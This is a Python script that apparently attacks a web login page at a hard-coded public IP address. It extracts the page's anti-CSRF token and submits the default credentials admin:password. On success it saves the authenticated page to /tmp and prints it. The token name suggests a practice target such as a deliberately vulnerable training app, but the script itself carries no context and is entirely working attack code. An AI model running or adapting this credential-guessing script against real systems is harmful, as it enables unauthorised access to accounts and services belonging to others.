
import requests
import re

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"

session = requests.Session()

# Get login page to extract token
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    print(f"[*] Found user_token: {user_token}")
else:
    print("[!] Could not find user_token")
    exit(1)

# Try admin:password
username = "admin"
password = "password"

print(f"\n[*] Trying credentials: {username}:{password}")

data = {
    "username": username,
    "password": password,
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=data, allow_redirects=True)

print(f"[*] Response URL: {response.url}")
print(f"[*] Response Status: {response.status_code}")

# Check if login was successful
if "Welcome" in response.text or "Logout" in response.text or "index.php" in response.url:
    print(f"\n[+] SUCCESS! Logged in as {username}:{password}")
    print(f"[+] Location: {response.url}")
    
    # Save the authenticated page
    with open("/tmp/authenticated.html", "w") as f:
        f.write(response.text)
    
    # Print first 500 chars of response
    print("\n[*] Response preview:")
    print(response.text[:1000])
else:
    print(f"\n[-] Login failed")
    print("\n[*] Response preview:")
    print(response.text[:1000])

